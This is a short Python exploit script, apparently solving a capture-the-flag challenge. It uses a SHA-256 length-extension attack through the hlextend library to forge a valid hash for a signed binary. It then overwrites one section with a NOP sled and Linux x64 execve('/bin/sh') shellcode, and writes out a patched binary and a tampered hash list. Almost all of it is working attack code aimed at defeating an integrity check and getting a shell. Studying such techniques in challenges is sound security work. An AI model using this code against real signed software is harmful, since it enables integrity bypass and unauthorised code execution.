# https://github.com/stephenbradshaw/hlextend
import hlextend
key = b'?'*30

with open('./src/signed_binary', "rb") as f:
    data = bytearray(f.read())

# with open('./src/test.txt', "r") as f:
with open('./src/hashes.txt', "r") as f:
    hashs = f.read().strip().splitlines()   

write_idx = 19
write_offset = 0x1168
write_len = 3736

target_idx = 30
target_offset = 0x3038
target_len = 80
salt = f's{target_idx}{target_idx-3:02X}'
start_hash = hashs[target_idx].split(':')[-1]
unknown_len = len(key) + len(salt)

# https://packetstormsecurity.com/files/153038/Linux-x64-execve-bin-sh-Shellcode.html
shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload =  b'\x90' * 100
payload += shell
payload = payload.ljust(write_len - target_len - 9 - (-(unknown_len + target_len + 9) % 64), b'\x90')

sha = hlextend.new('sha256')
new_data = sha.extend(payload, data[target_offset:target_offset+target_len], unknown_len, start_hash)
new_hash = sha.hexdigest()

data[write_offset:write_offset+write_len] = new_data
hashs[write_idx] = salt[1:] + '\x00:' + new_hash
with open('./exploit/shell', "wb") as f:
    f.write(data)
with open('./exploit/sus.txt', "w") as f:
    f.write('\n'.join(hashs))